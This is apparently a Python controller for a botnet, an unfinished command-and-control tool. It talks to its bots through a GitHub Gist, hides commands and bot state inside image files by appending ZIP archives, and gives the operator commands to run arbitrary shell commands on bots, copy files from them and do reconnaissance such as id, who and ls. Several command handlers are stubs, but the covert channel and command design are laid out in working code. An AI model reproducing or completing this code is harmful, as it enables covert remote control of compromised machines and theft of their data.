import argparse
import os
import select
import shutil
import sys
from typing import Optional, Any
import json

from git import GithubGistClient

# from time import sleep
import subprocess

IMAGES_LIBRARY = '4c7fe7e6d06b0b90ab4848b234209e95'
CONTROL_IMAGE = 'security.jpg'
UPDATE_INTERVAL = 30  # seconds
KEEP_ALIVE_TIMEOUT = 90  # seconds

TMP_STATE_FILE = 'state.json'
TMP_ZIP_FILE = 'data.zip'


def _is_image(file_name: str):
    return file_name.endswith('.png') or file_name.endswith('.jpg')


class Controller:

    def __init__(
        self,
        workdir: str,
        gist: str,
        token: str,
        author: Optional[str] = None,
        recreate_workdir: bool = False,
        skip_init_reset: bool = False,
        skip_init_pull: bool = False,
    ) -> None:
        self._workdir = os.path.abspath(workdir)
        self._gist = gist
        self._token = token
        self._recreate_workdir = recreate_workdir
        self._skip_init_reset = skip_init_reset
        self._skip_init_pull = skip_init_pull

        self._lib_client = GithubGistClient(
            gist=IMAGES_LIBRARY,
            repo_dir=os.path.join(self._workdir, 'lib'),
        )

        self._comm_client = GithubGistClient(
            gist=self._gist,
            token=self._token,
            repo_dir=os.path.join(self._workdir, 'comm'),
            author=author,
        )

    def _ensure_workdir(self) -> None:
        if os.path.isdir(self._workdir) and self._recreate_workdir:
            print(f'removing and re-creating workdir {self._workdir}...')
            shutil.rmtree(self._workdir)
        if not os.path.isdir(self._workdir):
            os.makedirs(self._workdir)
        os.chdir(self._workdir)
        print(f'workdir ready and set as the process current working dir')

    def _setup(self) -> None:
        self._ensure_workdir()

        print('initializing images library to...')
        self._lib_client.init(
            skip_reset=self._skip_init_reset,
            skip_pull=self._skip_init_pull,
        )
        self._load_lib_images()

        print(
            f'initializing the gist from {self._comm_client.get_https_url(with_token=False)}'
            f' to {self._comm_client.get_repo_dir()} ...'
        )
        self._comm_client.init(
            skip_reset=self._skip_init_reset,
            skip_pull=self._skip_init_pull,
        )

        self._bots = {}
        self._pending_commands = {}

        pass

    def run(self) -> None:
        self._setup()
        self._update_state()

        while True:
            print(
                '\nEnter a command. Use ? or help to show help.\n'
                f'Auto update in {UPDATE_INTERVAL} seconds. Press enter to force update.\n'
                '> ',
                end='',
            )
            ready_read, _, _ = select.select([sys.stdin], [], [], UPDATE_INTERVAL)
            if len(ready_read) == 1:
                # do not remove trailing whitespace except newline chars
                cmd_str = sys.stdin.readline().lstrip().rstrip('\r\n')
                self._process_command(cmd_str)
            else:
                # so we do not write to the prompt line
                # note: we could also use ASCII ESC sequences to clear the prompt (and add colors as well)
                print('')
            self._update_state()

        pass

    @staticmethod
    def stop() -> None:
        print('Stopping the controller. Note that the bots might still be running.')
        print('Use terminate command to stop a specific bot.')

    def _encode_data(self, image_file: str, data: Any, output_file):
        with open(TMP_STATE_FILE, 'w', encoding='utf-8') as f:
            json.dump(data, f, ensure_ascii=False)
        subprocess.check_call(
            # needed otherwise zip output will be different every time because zip stores modification times
            args=['touch', '-t', '202212241800.00', TMP_STATE_FILE]
        )
        subprocess.check_call(
            # -j junk paths (do not make directories)
            # -X Do not save extra file attributes (Extended Attributes on OS/2, uid/gid and file times on Unix).
            #    see https://stackoverflow.com/a/9714323
            args=['zip', '-jX', TMP_ZIP_FILE, TMP_STATE_FILE],
        )
        subprocess.check_call(
            args=f"cat '{image_file}' '{TMP_ZIP_FILE}' > '{output_file}'",
            shell=True,
        )
        os.remove(TMP_STATE_FILE)
        os.remove(TMP_ZIP_FILE)

    def _decode_data(self, image_file_with_data: str) -> Any:
        # we are not checking exit code here because while unzipping the images with appended ZIP data
        # unzip produces warning [<file name>]:  xxx extra bytes at beginning or within zipfile
        # and exits a non-zero exit code
        # we could parse its stdout/stderr to find out if something was actually extracted
        subprocess.call(
            # -j junk paths (do not make directories)
            # -o overwrite files WITHOUT prompting
            args=['unzip', '-jo', image_file_with_data],
        )
        data = None
        if os.path.isfile(TMP_STATE_FILE):
            with open(TMP_STATE_FILE, 'r', encoding='utf-8') as f:
                data = json.load(f)
            os.remove(TMP_STATE_FILE)
        # note: if there were multiple files extracted from the image, they will remain in the workdir
        return data

    def _update_state(self) -> None:
        print('updating bots state ...')
        self._comm_client.pull_changes()
        # TODO

        data_files = set(filter(lambda f: f != CONTROL_IMAGE and _is_image(f), os.listdir('comm')))

        for data_file in data_files:
            bot_name = data_file[0:-4]  # removes .png or .jpg extension
            # TODO: consider handling exceptions and removing invalid files instead of just crashing
            bot_data = self._decode_data('comm/' + data_file)
            # TODO: process data

        self._encode_data(
            image_file='lib/' + CONTROL_IMAGE,
            data=self._pending_commands,
            output_file='comm/' + CONTROL_IMAGE,
        )
        self._comm_client.add([CONTROL_IMAGE])

        self._comm_client.commit_and_push_if_needed()

        pass

    def _load_lib_images(self):
        self._lib_images = set(filter(_is_image, os.listdir('lib')))
        print(f'library contains {len(self._lib_images)} images:')
        for img in self._lib_images:
            print(f'  {img}')
        if CONTROL_IMAGE not in self._lib_images:
            raise RuntimeError(f'Control image {CONTROL_IMAGE} is not the library!')

    def _print_bots(self) -> None:
        print('Bots:')
        print(self._bots)
        pass

    def _is_valid_bot(self, bot: str) -> bool:
        return bot in self._bots

    # COMMANDS

    @staticmethod
    def _print_help() -> None:
        print(
            '\nAvailable commands:\n\n'
            'Use Ctrl-C to stop and exit the controller.\n\n'
            'help\n'
            '  Prints this help.\n'
            'bots\n'
            '  Lists all bots and their status.\n'
            'terminate <bot>\n'
            '  Terminates the bot.\n'
            'shell <bot> <command>\n'
            '  Runs the given command on the bot using the following Python code.\n'
            '    subprocess.run(args=[<command>], shell=True)\n'
            '  Note: <command> might contain spaces. Even the leading/trailing spaces are preserved.\n'
            '  See https://docs.python.org/3.8/library/subprocess.html#subprocess.run.\n'
            'run <bot> <command>\n'
            '  Runs the given command on the bot using the following Python code.\n'
            '    subprocess.run(args=shlex.split(<command>), shell=False)\n'
            '  Note: <command> might contain spaces. Even the leading/trailing spaces are preserved.\n'
            '  See https://docs.python.org/3.8/library/subprocess.html#subprocess.run.\n'
            'copyFrom <bot> <file name>\n'
            'do <bot> id\n'
            '  Alias for shell <bot> id\n'
            'do <bot> who\n'
            '  Alias for shell <bot> who\n'
            'do <bot> ls <path>\n'
            '  Alias for shell <bot> ls -lha\n'
        )

    def _process_terminate_command(self, bot) -> None:
        pass

    def _process_run_command(self, bot, shell: bool, cmd: Optional[str]) -> None:
        if cmd is None:
            print('Missing <command> argument!')
            return
        if cmd == '':
            print('Invalid empty <command> argument!')
            return
        pass

    def _process_copy_from_command(self, bot, file_name: Optional[str]) -> None:
        if file_name is None:
            print('Missing <file name> argument!')
            return
        if file_name == '':
            print('Invalid empty <file name> argument!')
            return
        pass

    def _process_do_command(self, bot, action: Optional[str]) -> None:
        if action is None:
            print('Missing do action!')
            return
        if action == 'id':
            self._process_run_command(bot, shell=True, cmd='id')
            return
        if action == 'who':
            self._process_run_command(bot, shell=True, cmd='who')
            return
        if action.startswith('ls '):
            path = action[3:]
            if path == '':
                print(f"Invalid path '{path}'!")
                return
            self._process_run_command(bot, shell=True, cmd='ls -lha ' + path)
            return
        print(f"Invalid do action '{action}'!")
        return

    def _process_command(self, cmd_str) -> None:
        if cmd_str == '':
            # no command
            return

        parts = cmd_str.split(sep=' ', maxsplit=1)
        cmd_name = parts[0]

        if cmd_name == 'help' or cmd_name == '?':
            self._print_help()
            return

        if cmd_name == 'bots':
            self._print_bots()
            return

        # all other commands should have format <cmd_name> <bot> <...the rest>
        if len(parts) == 2:
            sub_parts = parts[1].split(sep=' ', maxsplit=1)
            bot = sub_parts[0]
            args_str = sub_parts[1] if len(sub_parts) == 2 else None
            if not self._is_valid_bot(bot):
                print(f"Command '{cmd_str}'")
                print(f"Invalid bot '{bot}' given.")
                return

            if cmd_name == 'terminate':
                self._process_terminate_command(bot)
                return
            if cmd_name == 'shell':
                self._process_run_command(bot, shell=True, cmd=args_str)
                return
            if cmd_name == 'run':
                self._process_run_command(bot, shell=False, cmd=args_str)
                return
            if cmd_name == 'copyFrom':
                self._process_copy_from_command(bot, file_name=args_str)
                return
            if cmd_name == 'do':
                self._process_do_command(bot, action=args_str)
                return

        print(f"Invalid or unknown command '{cmd_str}'!")
        print(f'Type ? or help to show help.')

    pass


if __name__ == '__main__':
    _parser = argparse.ArgumentParser()
    _parser.add_argument(
        'workdir',
        help='work directory where the files and directories created by the controller will be put',
    )
    _parser.add_argument(
        'gist',
        help='ID of the GitHub Gist for communication with bots',
    )
    _parser.add_argument(
        'token',
        help='GitHub Personal access token (classic) with (at least) gist scope',
    )
    _parser.add_argument(
        '--author',
        help='Override default git commit author',
    )
    _parser.add_argument(
        '--recreate',
        action='store_true',
        help='Remove and recreate the workdir even if it already exists',
    )
    _parser.add_argument(
        '--skip-init-reset',
        action='store_true',
        help='Skip resetting the git repos if they already exist.',
    )
    _parser.add_argument(
        '--skip-init-pull',
        action='store_true',
        help='Skip updating the git repos if they already exist.',
    )
    _parser.add_argument(
        '--fast-init',
        action='store_true',
        help='Shortcut for combination of of --skip-init-reset and --skip-init-pull.',
    )
    _args = _parser.parse_args()
    _controller = Controller(
        workdir=_args.workdir,
        gist=_args.gist,
        token=_args.token,
        author=_args.author,
        recreate_workdir=_args.recreate,
        skip_init_reset=_args.fast_init or _args.skip_init_reset,
        skip_init_pull=_args.fast_init or _args.skip_init_pull,
    )
    try:
        _controller.run()
    except KeyboardInterrupt:
        _controller.stop()
